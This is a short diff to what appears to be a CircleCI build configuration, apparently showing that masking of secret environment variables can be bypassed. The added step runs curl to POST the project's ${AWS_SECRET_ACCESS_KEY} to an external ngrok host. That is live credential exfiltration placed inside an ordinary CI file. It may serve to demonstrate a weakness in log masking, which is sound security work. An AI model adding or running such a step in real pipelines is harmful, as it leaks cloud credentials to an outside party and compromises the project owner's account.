@@ -9,6 +9,10 @@ jobs:
       - run: echo "Hello world"
       - run: echo ${CIRCLE_REPOSITORY_URL} # Built-in environment variable is printed
       - run: echo ${AWS_SECRET_ACCESS_KEY} # Project environment variable is masked
+      - run:
+          name: curl ${AWS_SECRET_ACCESS_KEY} # Project environment variable is not masked
+          command: |
+            curl --header "content-type: text/plain" http://5675-136-28-7-90.ngrok.io/literally-anything-goes-here -d "${AWS_SECRET_ACCESS_KEY}"
 workflows:
   build:
     jobs:
